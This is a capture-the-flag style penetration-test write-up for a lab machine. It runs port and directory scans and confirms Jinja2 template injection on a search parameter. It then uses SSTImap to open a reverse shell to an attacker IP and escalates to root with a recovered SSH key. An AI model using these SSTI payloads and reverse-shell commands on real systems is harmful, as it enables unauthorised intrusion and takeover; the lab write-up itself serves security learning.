## NMAP
```
nmap -p- -A -T4 10.10.110.60
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 12:53 PDT
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 73.90% done; ETC: 12:53 (0:00:08 remaining)
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 89.12% done; ETC: 12:55 (0:00:17 remaining)
Nmap scan report for 10.10.110.60
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e228f4894851c4ab66b05a5f5c7e5c14 (ECDSA)
|_  256 e0baba30433d885a8ac7ec3b83781882 (ED25519)
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.4)
|_http-title: Genesis LLC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect res
```

## Gobuster
```
gobuster dir -u http://10.10.110.60 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
```
/products             (Status: 200) [Size: 3905]
```
Nothing in the directorys and could not run SQL Injection

Attempting SSTI
```
{{7*7}}

reports 49

```
http://10.10.110.60/products?search={{config.items()}}

Outputs
```
No results for dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
```
https://github.com/vladko312/SSTImap

This tool allows us to easily identify SSTI as well.

SSTImap
```
./sstimap.py -u http://10.10.110.60/products\?search\=john --reverse-shell 10.10.14.21 1234

```
Results
```
posix-linux $ whoami
walter
posix-linux $ 
```

Interactive Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Looking further into walters files I find this, I couldn't find anything in linpeas. 

Using walkters id_rsa allowed us to login as root

```
❯ nano id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.110.60
The authenticity of host '10.10.110.60 (10.10.110.60)' can't be established.
ED25519 key fingerprint is SHA256:P/+Aph3Jdlnz0ANn27+57+Fnv2PlXIOn7bEWKGbST5c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.60' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr  3 04:27:52 PM UTC 2023

  System load:  0.2119140625      Processes:               221
  Usage of /:   87.2% of 4.52GB   Users logged in:         0
  Memory usage: 22%               IPv4 address for ens160: 192.168.1.60
  Swap usage:   0%

  => / is using 87.2% of 4.52GB
  => There are 5 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 23 05:33:01 2022
root@APP01-Hades:~# 
```
